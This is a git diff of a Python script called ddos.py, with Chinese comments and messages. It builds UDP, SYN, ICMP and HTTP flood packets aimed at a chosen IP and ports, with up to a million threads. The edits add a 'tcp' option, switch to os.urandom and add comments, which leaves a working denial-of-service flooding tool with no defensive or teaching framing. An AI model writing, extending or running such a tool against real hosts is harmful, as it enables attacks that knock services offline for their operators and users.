@@ -31,11 +31,9 @@ class Attack:
         self.day = now.day
         self.month = now.month
         self.year = now.year
-        
         if not is_valid_ip(ip):
-            raise ValueError("无效的IP地址格式，请输入有效的IPv4或IPv6地址")
+            raise ValueError("无效的IP地址格式,请输入有效的IPv4或IPv6地址")
         self.ip = ip
-        
         if not ports:
             raise ValueError("至少需要指定一个端口")
         self.ports = []
@@ -49,7 +47,7 @@ class Attack:
             self.packet_types = ['udp']
         else:
             self.packet_types = [p.strip().lower() for p in packet_types.split(',')]
-            valid_types = {'udp', 'syn', 'http', 'icmp'}
+            valid_types = {'udp', 'syn', 'http', 'icmp','tcp'}
             for p in self.packet_types:
                 if p not in valid_types:
                     raise ValueError(f"无效包类型: {p} (仅支持 udp/syn/http/icmp)")
@@ -68,13 +66,13 @@ class Attack:
         self.sockets = []
         self.family = socket.AF_INET6 if ':' in self.ip else socket.AF_INET
 
-    def create_icmp_packet(self):
+    def create_icmp_packet(self): #创建icmp数据包
         icmp_type = 8
         icmp_code = 0
         checksum = 0
         identifier = random.randint(0, 65535)
         sequence = random.randint(0, 65535)
-        payload = random._urandom(32)
+        payload = os.urandom(32)
         
         header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
         packet = header + payload
@@ -91,7 +89,7 @@ class Attack:
         packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence) + payload
         return packet
 
-    def create_syn_packet(self):
+    def create_syn_packet(self): #创建syn数据包
         src_port = random.randint(1024, 65535)
         dst_port = random.choice(self.ports)
         seq_num = random.randint(0, 4294967295)
@@ -127,7 +125,7 @@ class Attack:
                                urg_ptr)
         return tcp_header
 
-    def create_http_packet(self):
+    def create_http_packet(self): #创建http数据包
         methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
         path = '/' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(3, 10)))
         host = self.ip
@@ -146,8 +144,8 @@ class Attack:
         )
         return http_request.encode()
 
-    def create_udp_packet(self):
-        return random._urandom(1490)
+    def create_udp_packet(self): #创建udp数据包
+        return os.urandom(1490)
 
     def attack_port(self, port):
         try:
@@ -213,11 +211,10 @@ class Attack:
                     sock.close()
                 except:
                     pass
-
 def print_usage():
     print("用法: python ddos.py <目标IP> <端口(多个用逗号分隔)> [选项]")
     print("选项:")
-    print("  -p, --packets  包类型(多个用逗号分隔, 默认udp) 可选: udp,syn,http,icmp")
+    print("  -p, --packets  包类型(多个用逗号分隔, 默认udp) 可选: tcp,udp,syn,http,icmp")
     print("  -s, --speed    攻击速度(1-1000, 默认500)")
     print("  -t, --threads  线程数(1-1000000, 默认1000)")
     print("\n示例:")
@@ -257,11 +254,11 @@ def main():
                 return
             i += 1
         
-        attack = Attack(ip, ports, packet_types, speed, threads)
+        attack = Attack(ip, ports, packet_types, speed, threads,)
         attack.start()
     except Exception as e:
         print(f"\n错误: {e}")
         print_usage()
 
 if __name__ == '__main__':
-    main()
+    main() 
